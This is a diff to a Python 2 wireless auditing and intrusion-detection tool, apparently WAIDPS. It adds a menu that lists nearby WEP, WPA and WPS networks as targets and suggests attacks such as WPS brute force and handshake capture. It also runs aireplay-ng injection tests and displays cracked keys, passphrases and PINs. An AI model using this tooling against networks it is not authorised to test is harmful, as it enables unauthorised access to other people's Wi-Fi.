@@ -4,14 +4,14 @@
 ## Author will be not responsible for any damage!
 ## Written By SY Chua, syworks@gmail.com
 ##
-## Current - WiFi Harvester & WIDS / IPS
+## Current - WiFi Harvester & IDPS & Auditor
 ##
 #############
 ## MODULES ##
 #############
 IMPORT_ERRMSG=""
 import __builtin__
-import os,sys,subprocess,getopt
+import os,sys,subprocess,getopt,glob
 import time,datetime
 import tty,termios,curses
 import select
@@ -20,6 +20,8 @@ import random
 import urllib
 import shutil
 import readline
+import threading
+from signal import SIGINT, SIGTERM
 from subprocess import Popen, call, PIPE
 from math import floor
 try:
@@ -34,11 +36,11 @@ try:
   import base64
 except:
   IMPORT_ERRMSG=IMPORT_ERRMSG + "      Error importing 'base64'\n"
-appver="1.0, R.1"
+appver="1.0, R.3"
 apptitle="WAIDPS"
 appDesc="- The Wireless Auditing, Intrusion Detection & Prevention System"
 appcreated="28 Feb 2014"
-appupdated="25 Apr 2014"
+appupdated="3 Jul 2014"
 appnote="Written By SY Chua, " + appcreated + ", Updated " + appupdated
 appdescription="Wiresless IDS-2 is a whole new application which is design to harvest all WiFi information (AP / Station details) in your surrounding and store as a database for reference. With the stored data, user can further lookup for specific MAC or names for detailed information of it relation to other MAC addresses. It primarily purpose is to detect wireless attacks in WEP/WPA/WPS encryption. It also comes with an analyzer and viewer which allow user to further probe and investigation on the intrusion/suspicious packets captured. Additional features such as blacklisting which allow user to monitor specific MACs/Names's activities. All information captured can also be saved into pcap files for further investigation."
 class fcolor:
@@ -504,6 +506,8 @@ def LineBreak():
 
 def OptDisplayLogs():
     printc ("+", fcolor.BBlue + "Displaying Active Logs History","")
+    print StdColor + tabspacefull + "This option allow user to list the current session logs that were captured. "
+    print ""
     Option1 = tabspacefull + SelBColor + "1" + StdColor + "/" + SelBColor + "C" + StdColor + " - Association/" + SelColor + "C" + StdColor + "onnection Alert Log\n"
     Option2 = tabspacefull + SelBColor + "2" + StdColor + "/" + SelBColor + "S" + StdColor + " - Display " + SelColor + "S" + StdColor + "uspicious Activity Listing\n"
     Option3 = tabspacefull + SelBColor + "3" + StdColor + "/" + SelBColor + "A" + StdColor + " - Display " + SelColor + "A" + StdColor + "ttacks Log\n"
@@ -556,6 +560,3738 @@ def OptDisplayLogs():
             printc ("!!!", "Combination Log History Not Found", "")
             printc ("x","","")
 
+def AddToList(sStr,sList):
+    x=0;Skip=0
+    if sStr!="" and str(sStr).find("\\x")==-1:
+        while x<len(sList):
+            if sList[x]==sStr:
+                Skip=1
+            x += 1
+        if Skip==0:
+            sList.append (sStr)
+    return sList
+
+def OptAuditing(HeaderLine):
+    Search="WAIDPS - Sniffing"
+    KillProc(Search)
+    Search="WAIDPS - Auditing"
+    KillProc(Search)
+    Search="WAIDPS - Associating"
+    KillProc(Search)
+    ToDisplay="ALL"
+    if HeaderLine=="1":
+        LineBreak()
+    if HeaderLine=="WEP":
+        ToDisplay="WEP"   
+    if HeaderLine=="WPA":
+        ToDisplay="WPA"   
+    if HeaderLine=="WPA1":
+        ToDisplay="WPA1"   
+    if HeaderLine=="WPA2":
+        ToDisplay="WPA2"   
+    if HeaderLine=="WPAC":
+        ToDisplay="WPAC"   
+    if HeaderLine=="WPA1C":
+        ToDisplay="WPA1C"   
+    if HeaderLine=="WPA2C":
+        ToDisplay="WPA2C"   
+    ESSID_FILTER=""
+    if len(HeaderLine)>6 and HeaderLine[:5]=="SSID=":
+        ToDisplay="ALL"   
+        ESSID_FILTER=HeaderLine[5:]
+    if len(HeaderLine)>7 and HeaderLine[:6]=="ESSID=":
+        ToDisplay="ALL"   
+        ESSID_FILTER=HeaderLine[6:]
+    if HeaderLine=="WPS":
+        ToDisplay="WPS"   
+    if ToDisplay=="ALL":
+        os.system('clear')
+        AUDITOR_WARNING()
+        printc ("+", fcolor.BBlue + "Wireless Network Auditing Main Menu","")
+        printc ("i",fcolor.SWhite + "Below are the list of collected WEP/WPA/WPA2 network with information of WPS enabled router and number associated clients.","")
+    else:
+        os.system('clear')
+        AUDITOR_WARNING()
+        printc ("i",fcolor.BBlue+ "Encryption Filter : " + fcolor.BRed + ToDisplay,"")
+    print ""
+    x=0
+    __builtin__.TargetList_WEP=[]
+    __builtin__.TargetList_WPA1=[]
+    __builtin__.TargetList_WPA2=[]
+    __builtin__.TargetList_WPA1C=[]
+    __builtin__.TargetList_WPA2C=[]
+    __builtin__.TargetList_WPS=[]
+    __builtin__.TargetList_All=[]
+    __builtin__.CUR_CLIENT=[]
+    while x<len(ListInfo_BSSID):
+        if int(__builtin__.ListInfo_SSIDTimeGap[x])<10:
+            if str(__builtin__.ListInfo_Privacy[x])!="" and str(__builtin__.ListInfo_Privacy[x])!="None" and str(__builtin__.ListInfo_Privacy[x])!="OPN" and + int(__builtin__.ListInfo_Channel[x])>0 and str(__builtin__.ListInfo_BestQuality[x])!="" and str(__builtin__.ListInfo_BestQuality[x])!="-1" and  str(__builtin__.ListInfo_BestQuality[x])!="-127":
+                Listing=str(__builtin__.ListInfo_BSSID[x]) + ";" + str(__builtin__.ListInfo_Channel[x]) + ";" + str(__builtin__.ListInfo_Privacy[x]) + ";" + str(__builtin__.ListInfo_Cipher[x]) + ";" + str(__builtin__.ListInfo_Auth[x]) + ";"  + str(__builtin__.ListInfo_BestQuality[x]) + ";" + str(__builtin__.ListInfo_LastSeen[x]) + " ["  + str(__builtin__.ListInfo_SSIDTimeGap[x]) + " min ago]" + ";"+ str(__builtin__.ListInfo_WPS[x]) + ";" + str(__builtin__.ListInfo_ConnectedClient[x]) + ";" + str(__builtin__.ListInfo_ESSID[x]) + ";" 
+                if str(__builtin__.ListInfo_Privacy[x])=="WEP":
+                    __builtin__.TargetList_WEP.append(Listing)
+                if str(__builtin__.ListInfo_Privacy[x])=="WPA" and str(__builtin__.ListInfo_WPS[x])=="-" and int(__builtin__.ListInfo_ConnectedClient[x])>0:
+                    __builtin__.TargetList_WPA1C.append(Listing)
+                if str(__builtin__.ListInfo_Privacy[x])=="WPA2" and str(__builtin__.ListInfo_WPS[x])=="-" and int(__builtin__.ListInfo_ConnectedClient[x])>0:
+                    __builtin__.TargetList_WPA2C.append(Listing)
+                if str(__builtin__.ListInfo_Privacy[x])=="WPA" and str(__builtin__.ListInfo_WPS[x])=="-" and  str(__builtin__.ListInfo_ConnectedClient[x])=="0":
+                    __builtin__.TargetList_WPA1.append(Listing)
+                if str(__builtin__.ListInfo_Privacy[x])=="WPA2" and str(__builtin__.ListInfo_WPS[x])=="-" and  str(__builtin__.ListInfo_ConnectedClient[x])=="0":
+                    __builtin__.TargetList_WPA2.append(Listing)
+                if str(__builtin__.ListInfo_WPS[x])!="-" and str(__builtin__.ListInfo_Privacy[x])!="WEP":
+                    __builtin__.TargetList_WPS.append(Listing)
+        x += 1
+    if ToDisplay=="WEP" or ToDisplay=="ALL":
+        x=0
+        while x<len(__builtin__.TargetList_WEP):
+            if ESSID_FILTER=="":
+                __builtin__.TargetList_All.append(__builtin__.TargetList_WEP[x])
+            else:
+                ColList=str(__builtin__.TargetList_WEP[x]).split(";")
+                TESSID=ColList[9]
+                TESSID=str(TESSID).upper()
+                if str(TESSID).find(ESSID_FILTER)!=-1:
+                    __builtin__.TargetList_All.append(__builtin__.TargetList_WEP[x])
+                
+            x +=1
+    if ToDisplay=="WPS" or ToDisplay=="ALL":
+        x=0
+        while x<len(__builtin__.TargetList_WPS):
+            if ESSID_FILTER=="":
+                __builtin__.TargetList_All.append(__builtin__.TargetList_WPS[x])
+            else:
+                ColList=str(__builtin__.TargetList_WPS[x]).split(";")
+                TESSID=ColList[9]
+                TESSID=str(TESSID).upper()
+                if str(TESSID).find(ESSID_FILTER)!=-1:
+                    __builtin__.TargetList_All.append(__builtin__.TargetList_WPS[x])
+            x +=1
+    if ToDisplay=="WPA1C" or ToDisplay=="WPAC" or ToDisplay=="ALL" :
+        x=0
+        while x<len(__builtin__.TargetList_WPA1C):
+            if ESSID_FILTER=="":
+                __builtin__.TargetList_All.append(__builtin__.TargetList_WPA1C[x])
+            else:
+                ColList=str(__builtin__.TargetList_WPA1C[x]).split(";")
+                TESSID=ColList[9]
+                TESSID=str(TESSID).upper()
+                if str(TESSID).find(ESSID_FILTER)!=-1:
+                    __builtin__.TargetList_All.append(__builtin__.TargetList_WPA1C[x])
+            x +=1
+    if ToDisplay=="WPA2C" or ToDisplay=="WPAC" or ToDisplay=="ALL" :
+        x=0
+        while x<len(__builtin__.TargetList_WPA2C):
+            if ESSID_FILTER=="":
+                __builtin__.TargetList_All.append(__builtin__.TargetList_WPA2C[x])
+            else:
+                ColList=str(__builtin__.TargetList_WPA2C[x]).split(";")
+                TESSID=ColList[9]
+                TESSID=str(TESSID).upper()
+                if str(TESSID).find(ESSID_FILTER)!=-1:
+                    __builtin__.TargetList_All.append(__builtin__.TargetList_WPA2C[x])
+            x +=1
+    if ToDisplay=="WPA1" or ToDisplay=="WPA" or ToDisplay=="ALL" :
+        x=0
+        while x<len(__builtin__.TargetList_WPA1):
+            if ESSID_FILTER=="":
+                __builtin__.TargetList_All.append(__builtin__.TargetList_WPA1[x])
+            else:
+                ColList=str(__builtin__.TargetList_WPA1[x]).split(";")
+                TESSID=ColList[9]
+                TESSID=str(TESSID).upper()
+                if str(TESSID).find(ESSID_FILTER)!=-1:
+                    __builtin__.TargetList_All.append(__builtin__.TargetList_WPA1[x])
+            x +=1
+    if ToDisplay=="WPA2" or ToDisplay=="WPA" or ToDisplay=="ALL" :
+        x=0
+        while x<len(__builtin__.TargetList_WPA2):
+            if ESSID_FILTER=="":
+                __builtin__.TargetList_All.append(__builtin__.TargetList_WPA2[x])
+            else:
+                ColList=str(__builtin__.TargetList_WPA2[x]).split(";")
+                TESSID=ColList[9]
+                TESSID=str(TESSID).upper()
+                if str(TESSID).find(ESSID_FILTER)!=-1:
+                    __builtin__.TargetList_All.append(__builtin__.TargetList_WPA2[x])
+            x +=1
+    x=0
+    ColList=[]
+    if len(__builtin__.TargetList_All)==0:
+        printc ("!!!","No listing found. Let harvester collect some network before running [Audit].","")
+        LineBreak()
+        return
+    print fcolor.BGreen + "S/N.".ljust(6) + "MAC Address".ljust(20) +  "Chn".ljust(5)  + "Enc".ljust(8) + "Cipher".ljust(15) + "Auth".ljust(10) + "Signal".ljust(10) + "Last Seen".ljust(34) + "WPS".ljust(5) + "Client".ljust(7) + "ESSID"
+    while x<len(__builtin__.TargetList_All):
+        DInfo=""
+        ColList=str(__builtin__.TargetList_All[x]).split(";")
+        Dct=str(x+1) + "."
+        QSignal=ColList[5] + " dBm"
+        List=Dct.ljust(6) + "*BSSID*" + ColList[0].ljust(20) +  "**CHN**" + ColList[1].ljust(5)  + "**ENC**" + ColList[2].ljust(8) + ColList[3].ljust(15) +  ColList[4].ljust(10) + "**SIG**" + QSignal.ljust(10) + "**LASTSEEN**" + ColList[6].ljust(34)+ "**WPS**" + ColList[7].ljust(5) + "**CLN**" + ColList[8].ljust(7) + "*ESSID*" + ColList[9]
+        List=List.replace("**LASTSEEN**",fcolor.SBlack).replace("*BSSID*",fcolor.SGreen).replace("*ESSID*",fcolor.SPink).replace("**ENC**WEP",fcolor.SRed + "WEP").replace("**ENC**WPA2",fcolor.SYellow + "WPA2").replace("**ENC**WPA",fcolor.SYellow+ "WPA").replace("**SIG**",fcolor.SBlue).replace("**CHN**",fcolor.SWhite).replace("**WPS**Yes",fcolor.SRed + "Yes"+ fcolor.SGreen).replace("**WPS**-",fcolor.SWhite + "-" + fcolor.SGreen).replace("**CLN**0",fcolor.SGreen + "0" + fcolor.SGreen).replace("**CLN**",fcolor.SRed).replace("**ENC**","")
+        TargetMAC=ColList[0]
+        __builtin__.ATTACK_AP_BSSID=TargetMAC
+        TargetMAC2=str(TargetMAC).replace(":","")
+        DInfo=CheckCrackingStatus(TargetMAC)
+        print fcolor.SWhite + List + str(DInfo)
+        x +=1
+    TargetMAC=str(TargetMAC).replace(":","")
+    WPACT=str(len(__builtin__.TargetList_WPA1) + len(__builtin__.TargetList_WPA2) + len(__builtin__.TargetList_WPA1C) + len(__builtin__.TargetList_WPA2C))
+    WPSCT=str(len(__builtin__.TargetList_WPS))
+    WEPCT=str(len(__builtin__.TargetList_WEP))
+    DrawLine("^",fcolor.CReset + fcolor.Black,"","")
+    if ToDisplay=="ALL" and ESSID_FILTER=="":
+        print tabspacefull + fcolor.BBlue + "Encryption Type".ljust(20) + fcolor.BPink + "WEP : " + fcolor.BWhite + str(WEPCT).ljust(22) + fcolor.BPink + "WPA/WPA2 : " + fcolor.BWhite + str(WPACT).ljust(20) + fcolor.BPink + "WPA/WPA2 (WPS Enabled) : " + fcolor.BWhite + str(WPSCT)
+        DrawLine("-",fcolor.CReset + fcolor.Black,"","")
+    CenterText(fcolor.BWhite + fcolor.BGRed, "WARNING - NOT FOR ILLEGAL USE")
+    printc (".",fcolor.SWhite + "Key in [Help] to display other options.","")
+    Result=AskQuestion("Select a target/option",fcolor.SWhite + "Default - Return","U","0","1")
+    if Result=="HELP":
+        LineBreak()
+        printc ("i",fcolor.BBlue + "Help Menu:","")
+        printc (" ",fcolor.BYellow + "ALL         " + fcolor.SWhite + " - Show all detected access points","")
+        printc (" ",fcolor.BYellow + "WEP         " + fcolor.SWhite + " - Show only access points with WEP Encryption","")
+        printc (" ",fcolor.BYellow + "WPA         " + fcolor.SWhite + " - Show access points with WPA/WPA2 Encryption and without client","")
+        printc (" ",fcolor.BYellow + "WPA1        " + fcolor.SWhite + " - Show only access points with WPA Encryption and without client","")
+        printc (" ",fcolor.BYellow + "WPA2        " + fcolor.SWhite + " - Show only access points with WPA2 Encryption and without client","")
+        printc (" ",fcolor.BYellow + "WPAC        " + fcolor.SWhite + " - Show access points with WPA/WPA2 Encryption and with detected client","")
+        printc (" ",fcolor.BYellow + "WPA1C       " + fcolor.SWhite + " - Show only access points with WPA Encryption and with detected client","")
+        printc (" ",fcolor.BYellow + "WPA2C       " + fcolor.SWhite + " - Show only access points with WPA2 Encryption and with detected client","")
+        printc (" ",fcolor.BYellow + "WPS         " + fcolor.SWhite + " - Show only access points with WPS enabled","")
+        printc (" ",fcolor.BYellow + "SSID=" + fcolor.SBlack + "<Name> " + fcolor.SWhite + " - Filter ESSID containing the name, Ex: SSID=SYWorks","")
+        printc (" ",fcolor.BYellow + "M" + fcolor.SBlack + "<Number>   " + fcolor.SWhite + " - Monitor the selected target instead of attacking. Ex : M3","")
+        printc (" ",fcolor.BYellow + "M" + fcolor.SBlack + "<MAC>      " + fcolor.SWhite + " - Monitor the selected target instead of attacking. Ex : M00:01:02:03:04:05","")
+        printc (" ",fcolor.BYellow + "HS/HANDSHAKE" + fcolor.SWhite + " - Display the list of captured handshakes for cracking.","")
+        printc (" ",fcolor.BYellow + "<Number>    " + fcolor.SWhite + " - Select the access point using the number assigned.","")
+        printc (" ",fcolor.BYellow + "<BSSID>     " + fcolor.SWhite + " - Instead of selecting using the number, user can also enter the MAC address of the access point..","")
+        printc (" ",fcolor.BYellow + "TESTINJECT  " + fcolor.SWhite + " - Test injection of the attacking interface [ " + str(__builtin__.SELECTED_ATK) + " - " + str(__builtin__.SELECTED_ATK_MAC) + " ]","")
+        LineBreak()
+        printc ("x","","")
+        OptAuditing(HeaderLine);return
+    if Result=="TESTINJECT" or Result=="TI":
+        DelFile(tmpdir + "Inject*.txt","")
+        printc (".",fcolor.SWhite + Now() + " - " + fcolor.BBlue + "Testing of Inject fore Interface " + fcolor.BRed +  str(__builtin__.SELECTED_ATK) + fcolor.BBlue +  " [ " + fcolor.BYellow +  str(__builtin__.SELECTED_ATK_MAC) + fcolor.BBlue +  " ]..","")
+        cmdLine="xterm -geometry 100x20-0-200 -iconic -bg black -fg white -fn 5x8 -title 'WAIDPS - Injection Test' -e 'aireplay-ng -9 " + str(__builtin__.SELECTED_MON) + " > " + tmpdir + "Inject.txt && echo 1 > " + tmpdir + "Inject2.txt" + "'"
+        ps=subprocess.Popen(cmdLine , shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'),preexec_fn=os.setsid)		
+        __builtin__.Sniffer=ps.pid
+        lline=[]
+        while IsFileDirExist(tmpdir + "Inject2.txt")!="F":
+            if IsFileDirExist(tmpdir + "Inject.txt")=="F":
+                with open(tmpdir + "Inject.txt","r") as f:
+                    lines=""
+                    for line in f:
+                        line=line.replace("\\r\\n","\n").replace("\\r","\n").replace("\\n","\n").replace("\r","\n")
+                        line=line.replace("\n\n","\n")
+                        line=line.replace("\n\n","\n")
+                        line=line.replace("\n\n","\n")
+                        lines=lines+line
+                    open(tmpdir + "Inject.txt","w").write(lines)
+                with open(tmpdir + "Inject.txt","r") as f:
+                    for line in f:
+                        line=line.replace("\\r\\n","\n").replace("\\r","\n").replace("\\n","\n")
+                        line=line.replace("\n","")
+                        lline=str(line).split(" ")
+                        if str(line).find("Trying broadcast probe requests")!=-1:
+                            printl ("\n" + fcolor.SWhite + "[.]   " + fcolor.BGreen + "Testing Broadcast Probe Requests..." ,"1","")
+                        if str(line).find("No Answer")!=-1:
+                            print fcolor.BRed + "No Answer"
+                        if str(line).find("/30:")!=-1:
+                            Pos=str(line).find("/30:")
+                            Pos=Pos-3
+                            sline=str(line)[Pos:]
+                            sline=str(sline).lstrip().rstrip().replace("\n","").replace("\r","")
+                            if len(sline)>5 and JP==1:
+                                sline=str(sline).replace("0:","0:\t" + fcolor.SWhite)
+                                print fcolor.SRed + str(sline) + ""
+                                JP=""
+                        if len(lline[0])==8 and len(lline)>2:
+                            line2=str(line)[10:]
+                            if str(line).find("  Found ")!=-1:
+                                print ""
+                                printc (".",fcolor.SGreen + str(line2),"")
+                            if str(line).find("Trying directed probe requests")!=-1:
+                                print fcolor.SWhite + "[.]   " + fcolor.BGreen + "Testing Directed Probe Requests..."
+                            if len(lline[2])==17:
+                                sptxt=line[10:]
+                                sptxt=sptxt.ljust(55) + fcolor.SBlack + ""
+                                sptxt=str(sptxt).replace(" - ", fcolor.SWhite + " \t" + fcolor.SPink).replace(" \t" + fcolor.SPink + "channel: ", fcolor.SWhite + " - CH ")
+                                printl (fcolor.SWhite + "      " + fcolor.SGreen + "Testing BSSID " + fcolor.SYellow + str(sptxt) +  fcolor.SGreen + " " ,"1","")
+                                JP=1
+                open(tmpdir + "Inject.txt","w").write("")
+                time.sleep(2)
+        print ""
+        DelFile(tmpdir + "Inject*.txt","")
+        LineBreak()
+        printc ("x","","")
+        OptAuditing(HeaderLine);return
+    if Result=="HS" or Result=="HANDSHAKE":
+        LineBreak()
+        HS_File=savedir + "Handshake_" + "*.cap"
+        CrackWPAKey(HS_File,"")
+        OptAuditing(Result);return
+    if Result=="0":
+        LineBreak()
+        return
+    if Result!="" and str(Result[:1]).upper()=="M":
+        BResult=str(Result)[1:]
+        PASS=""
+        if len(BResult)==17:
+            SELMAC=BResult
+            mi=FindMACIndex(BResult,ListInfo_BSSID)
+            if mi>-1:
+                PASS=1
+        elif BResult.isdigit()==True:
+            if int(BResult)>x:
+                printc ("!!!","Invalid target set !","")
+                LineBreak()
+                OptAuditing(HeaderLine);return
+                return
+            else:
+                PASS=1
+                BResult=int(BResult)-1
+                ColList=str(__builtin__.TargetList_All[int(BResult)]).split(";")
+                SELMAC=ColList[0]
+                mi=FindMACIndex(SELMAC,ListInfo_BSSID)
+        if PASS==1:
+                __builtin__.ATTACK_AP_BSSID=str(SELMAC)
+                __builtin__.ATTACK_AP_FS=str(ListInfo_FirstSeen[mi])
+                __builtin__.ATTACK_AP_LS=str(ListInfo_LastSeen[mi])
+                __builtin__.ATTACK_AP_PWR=str(ListInfo_BestQuality[mi])
+                __builtin__.ATTACK_AP_BEACON=str(ListInfo_Beacon[mi])
+                __builtin__.ATTACK_AP_DATA=str(ListInfo_Data[mi])
+                __builtin__.ATTACK_AP_ESSID=str(ListInfo_ESSID[mi])
+                __builtin__.ATTACK_AP_PRIVACY=str(ListInfo_Privacy[mi])
+                __builtin__.ATTACK_AP_CIPHER=str(ListInfo_Cipher[mi])
+                __builtin__.ATTACK_AP_AUTH=str(ListInfo_Auth[mi])
+                __builtin__.ATTACK_AP_CH=str(ListInfo_Channel[mi])
+                printc ("i",fcolor.BGreen + "Shutting down all interfaces .....","")
+                ShutdownMonitor()
+                KillAllMonitor()
+                CreateMonitor("1","")
+                LineBreak()
+                MonitorAccessPoint(__builtin__.ATTACK_AP_BSSID,"")
+                OptAuditing("")
+                return
+        else:
+            printc ("!!!","Invalid target set !","")
+            LineBreak()
+            OptAuditing(HeaderLine);return
+            return
+    if len(Result)==17 and IsHex(Result)==True:
+        cx=0
+        while cx<len(__builtin__.TargetList_All):
+            ColList=str(__builtin__.TargetList_All[int(cx)]).split(";")
+            if str(ColList[0]).upper()==str(Result).upper():
+                Result=str(cx+1)
+                cx=len(ColList)
+            cx += 1
+    if Result.isdigit()!=True:
+        if Result=="ALL" or Result=="WEP" or Result=="WPA" or Result=="WPAC" or Result=="WPA1" or Result=="WPA1C" or Result=="WPA2" or Result=="WPA2C" or Result=="WPS":
+            LineBreak()
+            OptAuditing(Result);return
+        else:
+            if len(Result)>5 and Result[:5]=="SSID=":
+                OptAuditing(Result);return
+            if len(Result)>6 and Result[:6]=="ESSID=":
+                OptAuditing(Result);return
+        LineBreak()
+        OptAuditing(Result);return
+    if int(Result)>x:
+        printc ("!!!","Invalid target set !","")
+        LineBreak()
+        OptAuditing(HeaderLine);return
+        return
+    LineBreak()
+    Result=int(Result)-1
+    ColList=str(__builtin__.TargetList_All[int(Result)]).split(";")
+    SELMAC=ColList[0]
+    SELENC=ColList[2]
+    SELCHN=ColList[1]
+    SELWPS=ColList[7]
+    SELCLN=ColList[8]
+    QSignal=ColList[5] + " dBm"
+    ATTACKMODE=""
+    if SELENC=="WEP":
+        ATTACKMODE="WEP"
+    if SELENC=="WPA" or SELENC=="WPA2":
+        if int(SELCLN)>0:
+            ATTACKMODE="WPA Handshake"
+            if SELWPS=="Yes":
+                ATTACKMODE="WPS Bruteforce"
+        elif SELWPS=="Yes":
+            ATTACKMODE="WPS Bruteforce"
+        else:
+            ATTACKMODE="No Client"
+    DB_CH=[]
+    DB_ESSID=[]
+    DB_CLIENT=[]
+    __builtin__.CUR_CLIENT=[]
+    __builtin__.CUR_CLIENT_FS=[]
+    __builtin__.CUR_CLIENT_LS=[]
+    __builtin__.CUR_CLIENT_PWR=[]
+    __builtin__.CUR_CLIENT_DATA=[]
+    print fcolor.BBlue + "Selected Target"
+    Result=fcolor.BYellow + "  AP BSSID " + fcolor.SWhite + "[ " + fcolor.BRed + SELMAC + fcolor.SWhite + " ]\t\t" + fcolor.SWhite + " Signal  : " + fcolor.BGreen + QSignal + "\n"
+    Result=Result+ str(DisplayOUIDetail(SELMAC,fcolor.BGreen)) 
+    Result=Result+ str(DisplayESSIDDetail(SELMAC,fcolor.BGreen))  
+    Result=Result+ str(DisplaySSIDDetail(SELMAC))
+    ClientMAC=""
+    if int(SELCLN)>0:
+        x=0
+        while x<len(ListInfo_STATION):
+            if __builtin__.ListInfo_CBSSID[x]==SELMAC:
+                ClientMAC=ClientMAC + str(ListInfo_STATION[x]) + " / "
+                __builtin__.CUR_CLIENT.append (ListInfo_STATION[x])
+                __builtin__.CUR_CLIENT_FS.append (ListInfo_CFirstSeen[x])
+                __builtin__.CUR_CLIENT_LS.append (ListInfo_CLastSeen[x])
+                __builtin__.CUR_CLIENT_PWR.append (ListInfo_CBestQuality[x])
+                __builtin__.CUR_CLIENT_DATA.append ("0")
+                __builtin__.CUR_CLIENT_PROBE.append ("")
+            x += 1
+        ClientMAC=ClientMAC[:-3]
+        ClientMAC=ClientMAC.replace(" / ", fcolor.SWhite + " / " + fcolor.SGreen)
+        Result=Result + fcolor.SWhite + "  Clients  : " + fcolor.SGreen + ClientMAC + "\n"
+                
+    print Result
+    if IsFileDirExist(DBFile2)=="F":
+        RecCt=0;DisplayText=""
+	with open(DBFile2,"r") as f:
+            next(f)
+	    for line in f:
+                line=line.replace("\n","")
+                tmpList=str(line).split(";")
+                if len(tmpList)>=18:
+                    if tmpList[0]==SELMAC:
+                        ESSID=str(tmpList[18])
+                        CHANNEL=str(tmpList[5])
+                        DB_ESSID=AddToList(ESSID,DB_ESSID)
+                        DB_CH=AddToList(CHANNEL,DB_CH)
+    if IsFileDirExist(DBFile3)=="F":
+	with open(DBFile3,"r") as f:
+            next(f)
+	    for line in f:
+                line=line.replace("\n","")
+                tmpList=str(line).split(";")
+                if len(tmpList)>=7:
+                    if tmpList[1]==SELMAC:
+                        ESSID=tmpList[6]
+                        CLIENTMAC=str(tmpList[0])
+                        DB_ESSID=AddToList(ESSID,DB_ESSID)
+                        DB_CLIENT=AddToList(CLIENTMAC,DB_CLIENT)
+    DB_ESSID.sort()
+    DB_CH.sort()
+    DB_CLIENT.sort()
+    if len(DB_ESSID)!=0 or len(DB_CH)!=0 or len(DB_CLIENT)!=0:
+        print fcolor.BBlue + "Previous Detail From Database"
+        if len(DB_ESSID)!=0:
+            Result=fcolor.BWhite + "ESSID   : " + fcolor.SGreen
+            ResultList=""
+            x=0
+            while x<len(DB_ESSID):
+                ResultList=ResultList + str(DB_ESSID[x]) + " / "
+                x += 1
+            ResultList=ResultList[:-3]
+            ResultList=ResultList.replace(" / ", fcolor.SWhite + " / " + fcolor.SGreen)
+            Result=Result + ResultList
+            print Result
+        if len(DB_CH)!=0:
+            Result=fcolor.BWhite + "Channel : " + fcolor.SGreen
+            ResultList=""
+            x=0
+            while x<len(DB_CH):
+                ResultList=ResultList + str(DB_CH[x]) + " / "
+                x += 1
+            ResultList=ResultList[:-3]
+            ResultList=ResultList.replace(" / ", fcolor.SWhite + " / " + fcolor.SGreen)
+            Result=Result + ResultList
+            print Result
+        if len(DB_CLIENT)!=0:
+            Result=fcolor.BWhite + "Clients : " + fcolor.SGreen
+            ResultList=""
+            x=0
+            while x<len(DB_CLIENT):
+                ResultList=ResultList + str(DB_CLIENT[x]) + " / "
+                x += 1
+            ResultList=ResultList[:-3]
+            ResultList=ResultList.replace(" / ", fcolor.SWhite + " / " + fcolor.SGreen)
+            Result=Result + ResultList
+            x=0
+            if len(CUR_CLIENT)>0:
+                while x<len(CUR_CLIENT):
+                    Result=Result.replace(CUR_CLIENT[x],fcolor.SPink + CUR_CLIENT[x] + fcolor.SWhite)
+                    x += 1
+            print Result
+    DrawLine("^",fcolor.CReset + fcolor.SWhite,"","")
+    FOUND=CheckCrackDB(SELMAC)
+    if FOUND=="1":
+        if IsHex(__builtin__.DB_ENCKEY)==True:
+            result=ConvertHex(__builtin__.DB_ENCKEY)
+        else:
+            result=__builtin__.DB_ENCKEY
+        OUI=Check_OUI(SELMAC,"")
+        printc ("i", fcolor.BRed + "The Access Point [ " + fcolor.BYellow + str(SELMAC) + fcolor.BRed + " ] was cracked !!","")
+        printc (" ", fcolor.SGreen + "ESSID            : " + fcolor.BPink + str(__builtin__.DB_ESSID) + fcolor.SGreen,"")
+        printc (" ", fcolor.SGreen + "Manufacturer     : " + fcolor.BCyan + str(OUI) + fcolor.SGreen,"")
+        printc (" ", fcolor.SGreen + "Encryption Type  : " + fcolor.BYellow + str(__builtin__.DB_ENCTYPE) ,"")
+        if str(__builtin__.DB_ENCTYPE).find("WEP")!=-1:
+            printc (" ", fcolor.SGreen + "Hexadecimal      : " + fcolor.BYellow + str(__builtin__.STR_HEXCOLON) + fcolor.SGreen + " / " + fcolor.BYellow + str(__builtin__.STR_HEX) + fcolor.SGreen + " [ "  + fcolor.SWhite + str(__builtin__.STR_LENHEX) + " Hexadecimal / " + str(__builtin__.STR_BIT) + " Bits" + fcolor.SGreen + " ]","")
+            printc (" ", fcolor.SGreen + "Characters       : " + fcolor.BRed + str(__builtin__.STR_CHR) + fcolor.SGreen + fcolor.SGreen + " [ "  + fcolor.SWhite + str(__builtin__.STR_LEN) + " Characters " + fcolor.SGreen + " ]","")
+        if str(__builtin__.DB_ENCTYPE).find("WPA")!=-1:
+            printc (" ", fcolor.SGreen + "WPA Passphase    : " + fcolor.BRed + str(__builtin__.DB_ENCKEY) + fcolor.SGreen + fcolor.SGreen + " [ "  + fcolor.SWhite + str(len(__builtin__.DB_ENCKEY)) + " Characters " + fcolor.SGreen + " ]","")
+        if str(__builtin__.DB_WPS)!="":
+            printc (" ", fcolor.SGreen + "WPS PIN          : " + fcolor.BYellow + str(__builtin__.DB_WPS) ,"")
+        print ""
+        usr_resp=AskQuestion(fcolor.BGreen + "Proceed to re-crack ?" + fcolor.BGreen,"y/N","U","N","1")
+        LineBreak()
+        if usr_resp!="Y":
+            OptAuditing("1")
+            return
+        print ""
+    printc (".",fcolor.SWhite + "Please note that after target selection is confirm, all current monitoring process will be terminated.\n","")
+    printc ("i", fcolor.BPink + "Suggested Attack Mode   : " + fcolor.BRed + str(ATTACKMODE) + "","")
+    LineBreak()
+    if ATTACKMODE=="WEP":
+        SUGGESTOPT="1"
+    elif ATTACKMODE=="WPS Bruteforce":
+        SUGGESTOPT="3"
+    elif SELENC=="WPA" or SELENC=="WPA2":
+        SUGGESTOPT="2"
+    else:
+        SUGGESTOPT="0"
+    mi=FindMACIndex(SELMAC,ListInfo_BSSID)
+    __builtin__.ATTACK_AP_BSSID=str(SELMAC)
+    __builtin__.ATTACK_AP_FS=str(ListInfo_FirstSeen[mi])
+    __builtin__.ATTACK_AP_LS=str(ListInfo_LastSeen[mi])
+    __builtin__.ATTACK_AP_PWR=str(ListInfo_BestQuality[mi])
+    __builtin__.ATTACK_AP_BEACON=str(ListInfo_Beacon[mi])
+    __builtin__.ATTACK_AP_DATA=str(ListInfo_Data[mi])
+    __builtin__.ATTACK_AP_ESSID=str(ListInfo_ESSID[mi])
+    __builtin__.ATTACK_AP_PRIVACY=str(ListInfo_Privacy[mi])
